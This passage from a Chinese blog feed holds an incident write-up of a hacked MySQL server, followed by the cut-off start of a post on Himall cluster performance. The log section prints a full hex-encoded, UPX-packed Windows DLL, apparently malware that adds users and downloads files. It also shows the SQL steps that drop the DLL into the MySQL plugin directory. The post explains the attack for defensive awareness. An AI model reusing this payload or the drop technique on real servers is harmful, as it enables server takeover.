console.log(max);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var txt = &amp;quot;max:&amp;quot;+max+&amp;quot;\n\r&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    txt= txt + str.substr(arr[maxindex],max)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    fs.writeFile(&amp;apos;result.txt&amp;apos;, txt, function (err) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (err) throw err;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        console.log(&amp;apos;It\&amp;apos;s saved!&amp;apos;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行程序查询日志之后发现我们的mysql已被人入侵&lt;br&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:05	84 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:08	85 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:11	86 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:15	87 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:17	88 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:18	89 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:21	90 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:23	91 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:26	92 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:34	93 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:35	93 Query	&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; autocommit=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;160623&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;36&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;93&lt;/span&gt; Quit	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;160623&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;37&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Connect&lt;/span&gt;	root@&lt;span class=&quot;number&quot;&gt;114.55&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.39&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.75&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;on&lt;/span&gt; mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; autocommit=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;VERSION&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;160623&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;38&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; @a = &lt;span class=&quot;keyword&quot;&gt;concat&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000EF55A8C1AB34C692AB34C692AB34C692C42BCC92AF34C692C42BC292A934C692AB34C692A834C692AB34C792B834C692C92BD592AC34C6929D12CD92A934C6925414C292AA34C69252696368AB34C692000000000000000000000000000000000000000000000000504500004C0103000E6DFF4F0000000000000000E0000E210B01060000100000001000000050000020660000006000000070000000000010001000000002000004000000000000000400000000000000008000000010000000000000020000000000100000100000000010000010000000000000100000006C71000070000000007000006C010000000000000000000000000000000000000000000000000000DC7100000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000500000001000000000000000040000000000000000000000000000800000E0555058310000000000100000006000000008000000040000000000000000000000000000400000E05550583200000000001000000070000000020000000C0000000000000000000000000000400000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E303400555058210D0902081292E561117752FFF14200001406000000500000260100C02F775FFE8B4C2408B801003BC8750A0C04890D21D8C2FCF676EC0C0090008B4412C7400813100432C0C3EE6FDFBE81EC34020C5355568D1810575033F6682E6E77FBDD906813808974241CC71528044DFF15315DB7BDFD0085C075208D531C8D542B515C183428D8EDD8EF52505633845123048B1B14520ADC5DFBEE08B9660033C08D7C244B20F3AB2ED375DDFF3F2850516A01565A383774073C5BB77B4D5C44B80750007FE80C03FB7BEBBA524D2835182F506A03663C568912768FFD6F2C1B4C8BAC244C0260942440398B1DFFFF7FEF74108B4D0827208B790483C9FFF2AEF7D12BF98BC18BF78BFA63DFFFFFC1E902F3A58BC883E103F3A4FFD38D8C24AC6D840694DBBB3F7303C01483BC24BC0D0275558B1BB0EEDEFD3783E804743E48740E48F6487543BF5D14EB41FF5E83E91CB4120B17150CEB2B83EFDDCFD8F802250704EB1B0620FCEB1413D6DC217F0AF0EB09E89DBA9F58B0367B6A00A107A3C1ED6B77B1A8CE8B115218F1586CEF164CF70F85D500E93513062620A8FFD6CAC9EDDD8B3D0E1C68102715FFD7886CD662C10F4AEE1406EFFFB16F840470EC3C8BF083C40885F674165614C2DBD8916C38560634190C8DBC599F139E2CAA83C177E6308BB4E11BB608802704D44889460C5154FBD8EF83C352514D40502A2C8B7E0C40750BDB162714438BAB54335F7FFCD6B84B49899F325E5D5B81C482C38B45DE2C65BB08268B386965703E4343C0691752186710422E994084080B3F256C90000F8B400C5974EB4ED8B30846405921FF25134C05B8A11B1948543108F50E39052FECBE6F59DC7E2EFF0D078B051024FE018B09CB21FD4871E0753F6880383059BEF7B7BBA314E875049EEB66832000A10DBC041FBBE1FB04001CE4E204A6FF555959EB3D6AAF8B756339269B305E21E3D8FF5FA471FC3BF072128B0E85C97407FFD11E83EE672DFD1D6CEABB83251100595E2F5885FFDF30F2C1EC538B5D08568B750C578B7D10E76DB4FFF77509833D5F00EB2683FE01740504E62287E97EF364EC09575653FFD0080C6FDDFDFBDC5E82B04E0FA3FBFFFF3389450CDF60ADAE4C17372B23F64603BBDD0ED8752634032125837D7F74115BFBD6450E083C8B025F5E5B5D9C88223B824D280000DF2E7FA877726F6E672E6F6B0328257329DBCBF6FF20706F72746E756D626572200F646F73760A7304D8FBB66925201E002728FFFFADB9002B03633A5C57696E646F77735C76332E6C6F6BBFE4BB6717612B62004374656D70040384BD6F7F3230395C6D61142E657865371F9574FFFE6973657475701A202D6F223D77DAB7EDDB221A70616263057963556E6B6E1E6CF7DEDE07546F6F2F6C64218F50585007EE6F83FC32303033302368652D6E65770BF7BF05B2387737410064006D0069006E03AFB9AE7D7300740072C9056F070D006EEC7FB2611F6C0076003100320033177013A4E1CC6D2365252750394EFDFF0B4159595354454D5C43757272656E74436FED60DBB60372AE53735C0A5C5425FE19B6B76D90616C201472609D5374617400B4BF1967A15244502D5463A4C8561484230CB2398A0AB01010806DF9FF0144656C65746546696C6541470A566DBBDD91BC45780E57690765630853FB9F66BB1D657034BD0052656743726561376BDF8E7D4B6579410E5175377956616C063969B6F717206C6F731F36CA24E0CDFDFF5F61646A7573745F666469760D5D697474DB6E6F0DD60A7370720C7466086D41F7EEED5A367066633D077075747306D36C9B796F70656E73654ED548B5B16FDB4EAD5524724164640B4C386B0276BF3D47726F7570114D6557732D5BFB9F66E25455524C446F776E578454FDFF63B36FEF00172F171D070B260827200839251610FFFFFFBF0A0B212007080E0E070705060F06071D24073F2207471406060E08060B0DEDFFAD6D180500060A150C0622125C1C005045416F8351FF4C0104000E6DFF4F43E00D210B019C7D7684062A0030130D14000F20969D278F10001004000717A40BD650272A02029AEDD9B207067022076E5CF2818CEA4F78DC4000008406922E40575C2E5BF67417B87874B8B0100342CFB6F121602E72642661CCDE2062876C0903A2402E26940CD2DC27F001303036D91CDBC04F652010BC27657353724042043E210000B8870AE5480412000000FF000000000000000000000000807C2408010F85B901000060BE006000108DBE00B0FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B9070000008A07472CE83C0177F7803F0175F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE004000008B0709C0743C8B5F048D84300060000001F35083C708FF9678600000958A074708C074DC89F95748F2AE55FF967C60000009C07407890383C304EBE16131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAE806000008DBE00F0FFFFBB0010000050546A045357FFD58D870702000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E924ACFFFF0000000000000000000000000000000000000000000000000000000000000000000000B070000078700000000000000000000000000000BD70000090700000000000000000000000000000CA70000098700000000000000000000000000000D5700000A0700000000000000000000000000000E2700000A87000000000000000000000000000000000000000000000EC700000FA7000000A7100001A7100002871000000000000367100000000000044710000000000004A7100000000000056710000000000004B45524E454C33322E444C4C0041445641504933322E646C6C004D53564352542E646C6C004E455441504933322E646C6C0075726C6D6F6E2E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000526567436C6F73654B65790000006672656500004E657455736572416464000055524C446F776E6C6F6164546F46696C65410000000000000E6DFF4F00000000B271000001000000030000000300000094710000A0710000AC710000301000003013000020100000BC710000C2710000CF7100000000010002006D7973716C2E646C6C007870646C33007870646C335F6465696E6974007870646C335F696E6974000000006000000C0000002D360000000000000000000000000000000000000000000000000000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;use&lt;/span&gt; mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;drop&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;IF&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;EXISTS&lt;/span&gt; yongger2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;SHOW&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;WARNINGS&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;table&lt;/span&gt; yongger2(&lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt; LONGBLOB)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;160623&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;39&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;insert&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;into&lt;/span&gt; yongger2 &lt;span class=&quot;keyword&quot;&gt;values&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;update&lt;/span&gt; yongger2 &lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt; = @a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; @dir2 = &lt;span class=&quot;keyword&quot;&gt;concat&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;select data from yongger2 into DUMPFILE &quot;&#39;&lt;/span&gt;,@@plugin_dir,&lt;span class=&quot;string&quot;&gt;&#39;\\cna12.dll&quot;&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; @dir2 = &lt;span class=&quot;keyword&quot;&gt;replace&lt;/span&gt;(@dir2,&lt;span class=&quot;string&quot;&gt;&#39;\\&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;\\\\&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; @dir2 = &lt;span class=&quot;keyword&quot;&gt;replace&lt;/span&gt;(@dir2,&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;\\\\&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;160623&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;40&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;prepare&lt;/span&gt; sql3 &lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; @dir2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Prepare&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; yongger2 &lt;span class=&quot;keyword&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;DUMPFILE&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;C:\\Program Files (x86)\\MySQL\\MySQL Server 5.6\\lib\\plugin\\\\cna12.dll&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;....&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;....&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;....&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;后面&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;W行省略&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;后面的内容真是看不下去,种了无数dll到服务器上。整个服务器被控制。&lt;br&gt;然后。。。。我就没有然后了。。。。。。。。。。。。&lt;/p&gt;
&lt;h2 id=&quot;最后&quot;&gt;&lt;a href=&quot;#最后&quot; class=&quot;headerlink&quot; title=&quot;最后&quot;&gt;&lt;/a&gt;最后&lt;/h2&gt;&lt;p&gt;遇到这种情况，好像只能重装系统了。&lt;br&gt;特别要注意的是:0x4D5A是pe文件头，如果你的日志中出现这个，请提高警觉。&lt;br&gt;PS:PE文件的全称是Portable Executable，意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE文件，PE文件是微软Windows操作系统上的程序文件（可能是间接被执行，如DLL）&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;情况&quot;&gt;&lt;a href=&quot;#情况&quot; class=&quot;headerlink&quot; title=&quot;情况&quot;&gt;&lt;/a&gt;情况&lt;/h2&gt;&lt;p&gt;最近公司网站出现所有页面无法访问数据库的问题，但是mysql第三方客户端又可以访问如workbench,但是重启mysql服务之后，网站又恢
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Himall集群版解决方案及性能测试结果</title>
    <link href="http://binyanbin.github.io/2016/06/07/hishop-3/"/>
    <id>http://binyanbin.github.io/2016/06/07/hishop-3/</id>
    <published>2016-06-06T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;架构设计&quot;&gt;&lt;a href=&quot;#架构设计&quot; class=&quot;headerlink&quot; title=&quot;架构设计&quot;&gt;&lt;/a&gt;架构设计&lt;/h2&gt;&lt;p&gt;集中架构设计出于系统的可扩展性、可维护性以及成本等多方面的因素考虑，逐渐被放弃，转而采用分布式的架构设计。常用分布式架构采用按模块纵向分解的方式,然后纵向分解中的某些模块仍有可能是一个复杂且庞大的业务，需要继续进行拆分。每个模块又由许多个微服务完成业务功能，微服务可独部署弹性伸缩。下图为Himall分布式集群版的整体架构设计:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-11.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;部署图&quot;&gt;&lt;a href=&quot;#部署图&quot; class=&quot;headerlink&quot; title=&quot;部署图&quot;&gt;&lt;/a&gt;部署图&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-12.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;标准部署方案的业务支撑能力&quot;&gt;&lt;a href=&quot;#标准部署方案的业务支撑能力&quot; class=&quot;headerlink&quot; title=&quot;标准部署方案的业务支撑能力&quot;&gt;&lt;/a&gt;标准部署方案的业务支撑能力&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;并发用户数（VU）&lt;/th&gt;
&lt;th&gt;平均响应时间（RT）&lt;/th&gt;
&lt;th&gt;每秒事务数（TPS）&lt;/th&gt;
&lt;th&gt;日均最大PV（11小时峰值测试）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;3000&lt;/td&gt;
&lt;td&gt;4秒内&lt;/td&gt;
&lt;td&gt;2000&lt;/td&gt;
&lt;td&gt;约7920万&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&quot;标准集群部署配置&quot;&gt;&lt;a href=&quot;#标准集群部署配置&quot; class=&quot;headerlink&quot; title=&quot;标准集群部署配置&quot;&gt;&lt;/a&gt;标准集群部署配置&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;硬件（设施）&lt;/th&gt;
&lt;th&gt;配置&lt;/th&gt;
&lt;th&gt;数量&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;SLB负载均衡服务器&lt;/td&gt;
&lt;td&gt;依实际流量付费&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;前端应用服务器&lt;/td&gt;
&lt;td&gt;Intel Xeon E5-2430 2.2GHz 8G RAM 64位Win 2008 R2&lt;/td&gt;
&lt;td&gt;3 ~ 6&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;后端应用服务器&lt;/td&gt;
&lt;td&gt;Intel Xeon E5-2430 2.2GHz 8G RAM 64位Win 2008 R2&lt;/td&gt;
&lt;td&gt;6 ~ 10&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CDN内容加速&lt;/td&gt;
&lt;td&gt;依图片及视频等资源的容量和使用量付费&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Redis集群&lt;/td&gt;
&lt;td&gt;热点内容缓存&lt;/td&gt;
&lt;td&gt;按使用收费&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DRDS&lt;/td&gt;
&lt;td&gt;按使用收费&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&quot;标准配置性能测试数据&quot;&gt;&lt;a href=&quot;#标准配置性能测试数据&quot; class=&quot;headerlink&quot; title=&quot;标准配置性能测试数据&quot;&gt;&lt;/a&gt;标准配置性能测试数据&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;服务器&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;测试服务器&lt;/td&gt;
&lt;td&gt;一台ECS 系统:centOS 测试软件:Jmeter&lt;/td&gt;
&lt;/tr&gt;
